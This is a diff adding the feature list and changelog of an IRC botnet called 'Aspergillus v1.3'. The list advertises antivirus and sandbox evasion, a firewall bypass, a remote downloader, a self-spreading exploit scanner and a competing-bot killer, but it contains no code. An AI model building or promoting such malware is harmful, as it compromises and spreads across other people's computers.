@@ -1,0 +1,35 @@
+Aspergillus v1.3:
+- unlimited irc servers (domain) supported
+- very stable irc bot using byte per byte stream reading and parsing when terminating bytes received
+- multicommand topic&privmsg parsing
+- using select to determine irc connection timeout and then reconnect
+- xored irc strings (anti-AV detection, anti-BK detection)
+- nulling expired strings (anti-BK detection)
+- service mode
+- melt after installation
+- not install into windows or system32 directory (anti-BK detection)
+- no registry startup (anti-BK detection)
+- antisandbox
+- windows xp sp2 firewall bypass
+- http socket downloader (anti-AV detection)
+- MD5 protected download/remove
+- spreader:
+	*multithreaded
+	*ipranges (a, b, c, y)
+	*sequential, random
+	*using cftp or not
+	*lan bots scanning ext range
+	*multiple exploits support (easy to add them)
+- offline spreader (same features as spreader, using multiple predefined settings)
+- cftp support
+- multithreaded ftp daemon (byte per byte reading with timeout)
+- all strings listed on top of each cpp file so they can be easily changed (hint: quickly translate bot to your language)
+(EVERYTHING except service mode WRITTEN FROM SCRATCH!)
+
+Optional:
+- tcpip.sys patcher
+- botkiller
+- Exploits: SYM, VNCpass
+
+Version 1.3:
+- fixed major bug in IRC_Listen function that caused inapropriate bot response when IRCd terminated
